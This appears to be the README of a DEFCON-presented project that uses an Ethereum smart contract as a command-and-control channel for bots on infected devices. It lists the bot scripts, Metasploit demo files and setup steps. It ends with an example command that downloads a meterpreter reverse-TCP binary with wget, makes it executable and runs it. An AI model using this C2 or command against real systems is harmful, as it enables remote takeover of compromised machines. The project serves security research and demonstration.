# DAPPin that Gas | A Blockchain Enabled C2 Solution


A C2 solution that lives in the blockchain as a DAPP.

Core Contents:
* [SpectralCommandRelay.sol](./contracts/SpectralCommandRelay.sol): Smart Contract that can be deployed to the blockchain to act as a C2 channel
* [bot_minimal.py](./bots/bot_minimal.py): An incredibly simple endpoint for our C2 blockchain solution to be run on infected devices
* [bot_deployer.py](./bots/bot_deployer.py): Script that generates & manages a local botnet
* [bot_template.py](./bots/bot_template.py): Template for a more advanced endpoint for our C2 blockchain solution to be run on infected devices

Demo Contents:
* [SCR_Demo_Meter.rc](./demo/SCR_Demo_Meter.rc): MSFConsole init script used in our local botnet demo
* [cleanup.sh](./demo/cleanup.sh): Script to cleanup any lingering meterpreter sessions after our demo

Presentation Contents:
* [DAPPin_that_Gas_DEFCON_Submission_BlockchainC2.pptx](./demo/DAPPin_that_Gas_DEFCON_Submission_BlockchainC2.pptx): The powerpoint we sent to the DEFCON Talks Panel



# How to Play

* Get setup with a web3 wallet, the [Metamask](https://chrome.google.com/webstore/detail/metamask/nkbihfbeogaeaoehlefnkodbefgpgknn) chrome plugin is pretty quick and straight forward
* Grab [SpectralCommandRelay.sol](./contracts/SpectralCommandRelay.sol) and paste it into [https://remix.ethereum.org/](https://remix.ethereum.org/).
* Compile our .sol script
* Switch your web3 provider to "Injected Web3" and set your network to the "Rinkeby" testchain.
* Either deploy an instance of the relay or "Load at address" 0x69429FB223b3BA3D5823B980E590bF857a680c13
* Grab some [scratch on rinkeby](https://faucet.rinkeby.io/) and start sending commands

An Example command that installs and runs a meterpreter shell on an infected device which is running our [bot_minimal.py](./bots/bot_minimal.py) script
```
0~wget https://github.com/Cooperw/meterpreter_executables/raw/main/linux_x64_meterpreter_reverse_tcp_local_4444.elf; chmod +x linux_x64_meterpreter_reverse_tcp_local_4444.elf; ./linux_x64_meterpreter_reverse_tcp_local_4444.elf
```
